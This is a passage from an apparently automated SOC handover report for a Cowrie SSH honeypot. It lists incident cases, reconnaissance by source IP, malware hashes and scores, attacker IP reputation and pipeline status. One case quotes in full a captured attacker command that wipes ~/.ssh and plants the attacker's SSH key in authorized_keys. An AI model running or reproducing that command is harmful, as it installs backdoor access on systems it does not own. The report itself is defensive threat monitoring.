| `2026-04-23 05:45:05` | `cowrie.command.failed` |
| `2026-04-23 05:45:05` | `cowrie.log.closed` |
| `2026-04-23 05:45:05` | `cowrie.session.params` |
| `2026-04-23 05:45:05` | `cowrie.command.input` |
| `2026-04-23 05:45:05` | `cowrie.session.file_download` |
| `2026-04-23 05:45:05` | `cowrie.log.closed` |
| `2026-04-23 05:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31dec43b03cf

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:45 |
| **Last Seen** | 2026-04-23 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:45:07` | `cowrie.session.connect` |
| `2026-04-23 05:45:07` | `cowrie.client.version` |
| `2026-04-23 05:45:07` | `cowrie.client.kex` |
| `2026-04-23 05:45:07` | `cowrie.login.success` |
| `2026-04-23 05:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3fe3590e1b

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-23 05:56 |
| **Last Seen** | 2026-04-23 05:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:56:23` | `cowrie.session.connect` |
| `2026-04-23 05:56:23` | `cowrie.client.version` |
| `2026-04-23 05:56:24` | `cowrie.client.kex` |
| `2026-04-23 05:56:26` | `cowrie.login.success` |
| `2026-04-23 05:56:27` | `cowrie.session.params` |
| `2026-04-23 05:56:27` | `cowrie.command.input` |
| `2026-04-23 05:56:27` | `cowrie.command.failed` |
| `2026-04-23 05:56:27` | `cowrie.log.closed` |
| `2026-04-23 05:56:28` | `cowrie.session.params` |
| `2026-04-23 05:56:28` | `cowrie.command.input` |
| `2026-04-23 05:56:28` | `cowrie.session.file_download` |
| `2026-04-23 05:56:28` | `cowrie.log.closed` |
| `2026-04-23 05:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3371b6aa48c7

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-23 05:56 |
| **Last Seen** | 2026-04-23 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:56:32` | `cowrie.session.connect` |
| `2026-04-23 05:56:32` | `cowrie.client.version` |
| `2026-04-23 05:56:32` | `cowrie.client.kex` |
| `2026-04-23 05:56:34` | `cowrie.login.success` |
| `2026-04-23 05:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.183.74[.]182` | **26** | 2026-04-23 04:31 | 2026-04-23 05:20 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.20[.]216` | **26** | 2026-04-23 04:56 | 2026-04-23 05:45 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.143[.]203` | **25** | 2026-04-23 03:41 | 2026-04-23 04:14 | 32m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.43[.]1` | **15** | 2026-04-23 03:36 | 2026-04-23 03:39 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `3.134.216[.]108` | **5** | 2026-04-23 04:06 | 2026-04-23 04:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.57[.]208` | **4** | 2026-04-23 05:52 | 2026-04-23 06:06 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.134.94[.]132` | **4** | 2026-04-23 03:10 | 2026-04-23 03:10 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.104[.]242` | **2** | 2026-04-23 04:30 | 2026-04-23 04:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `128.203.204[.]25` | **2** | 2026-04-23 05:21 | 2026-04-23 05:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.29.255[.]113` | 1 | 2026-04-23 04:30 | 2026-04-23 04:31 | 102s | 0 | `T1592` | 🟢 LOW |
| `111.47.243[.]219` | 1 | 2026-04-23 03:40 | 2026-04-23 03:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.200.121[.]70` | 1 | 2026-04-23 03:59 | 2026-04-23 03:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-04-23 04:30 | 2026-04-23 04:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `134.209.235[.]25` | 1 | 2026-04-23 04:27 | 2026-04-23 04:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-04-23 03:34 | 2026-04-23 03:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `202.103.55[.]158` | 1 | 2026-04-23 05:21 | 2026-04-23 05:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `209.38.69[.]153` | 1 | 2026-04-23 05:56 | 2026-04-23 05:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.181.171[.]136` | 1 | 2026-04-23 05:19 | 2026-04-23 05:20 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.154.20[.]216` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 1 |
| `209.38.69[.]153` | US | DigitalOcean, LLC | **100** ⚠️ | 15 |
| `128.203.204[.]25` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `223.123.43[.]1` | PK | CMPak Limited | **100** ⚠️ | 38 |
| `183.201.208[.]25` | CN | China Mobile Communications Corporation | **100** ⚠️ | 31 |
| `116.147.40[.]93` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 50 |
| `3.134.216[.]108` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `180.76.57[.]208` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `202.103.55[.]158` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `103.183.74[.]182` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 180 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 201 cases |
| Tool 34  | Credential Extractor        | ✅ 142 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (10.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 18 recon entry/entries in table (9 group(s) consolidating 109 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T06:09:24Z_
